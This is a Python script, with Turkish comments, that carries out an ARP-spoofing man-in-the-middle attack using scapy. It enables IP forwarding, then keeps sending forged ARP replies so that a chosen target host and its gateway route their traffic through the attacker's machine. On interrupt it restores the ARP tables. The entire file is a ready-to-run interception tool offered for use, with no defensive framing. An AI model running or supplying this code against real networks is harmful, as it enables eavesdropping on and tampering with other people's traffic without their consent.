#İlk 2 satır scapy tarafından gelen gereksiz uyarı mesajlarını kapatmak içindir.
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
#--------------------------------------------
import scapy.all as scapy
import optparse
import subprocess
from time import sleep

def get_user_info():
    optionParser = optparse.OptionParser()
    optionParser.add_option("-t", "--target", "--tp", "--targetip", dest="target_ip")
    optionParser.add_option("-g", "--gateway", "--gp", "--gatewayip", dest="gateway_ip")
    inputs = optionParser.parse_args()[0]
    if not inputs.target_ip:
        print("[!] Please enter a target IP!")
        exit()
    if not inputs.gateway_ip:
        print("\r[!] Your default gateway IP has been set to 10.0.2.1", end="")
        inputs.gateway_ip = "10.0.2.1"
    return inputs

def activate_ip_forwarding():
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], shell=True)

def get_mac_adress(target_ip):
    combined_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip)
    (ans, unans) = scapy.srp(combined_packet, verbose=False, timeout=1)
    return str(ans[0][1].hwsrc)

def poisoning(target_ip, poisoned_ip):
    arp_packet = scapy.ARP(op=2, hwdst=get_mac_adress(target_ip), pdst=target_ip, psrc=poisoned_ip) #hwsrc default direkt bizim macimizi alıyor.
    scapy.send(arp_packet, verbose=False)

def reset_process(target_ip, reset_ip):
    arp_packet = scapy.ARP(op=2, hwdst=get_mac_adress(target_ip), pdst=target_ip, psrc=reset_ip, hwsrc=get_mac_adress(reset_ip))
    scapy.send(arp_packet, verbose=False, count=7)

activate_ip_forwarding()

target_ip = get_user_info().target_ip
gateway_ip = get_user_info().gateway_ip
try: 
    number = 0
    print("\n--- MITM Attack has been started! ---", end="\n")
    while True:
        poisoning(target_ip, gateway_ip)
        poisoning(gateway_ip, target_ip)
        number += 2
        print(f"\r[✓] {number} packets have been sent.", end="")
        sleep(3)

except KeyboardInterrupt:
    reset_process(target_ip, gateway_ip)
    reset_process(gateway_ip, target_ip)
    print("\n[✓] Operation finished successfully! \n[!] MAC adresses has been changed to the default.")